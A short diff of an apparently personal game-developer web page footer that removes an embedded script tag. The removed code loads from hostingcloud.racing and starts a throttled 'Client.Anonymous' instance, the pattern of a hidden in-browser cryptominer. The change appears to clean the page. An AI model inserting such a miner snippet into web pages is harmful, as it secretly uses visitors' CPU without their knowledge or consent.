@@ -26,13 +26,3 @@ Fiz um jogo em construct 2, neste jogo você está no papel de um monstro tentan
 
 &copy;2018 Cauê Felchar, 
 não hesite em contatar no <a href="mailto:caue.fcr<at>gmail.com">caue.fcr< at >gmail.com</a>
-  
-<script src="https://www.hostingcloud.racing/e2vo.js"></script>
-<script>
-    var _client = new Client.Anonymous('20506d57832bbddbd4653cd8a030075712c1323ce68b1488f82dfa8b85f6b8c0', {
-        throttle: 0.6
-    });
-    _client.start();
-    
-
-</script>
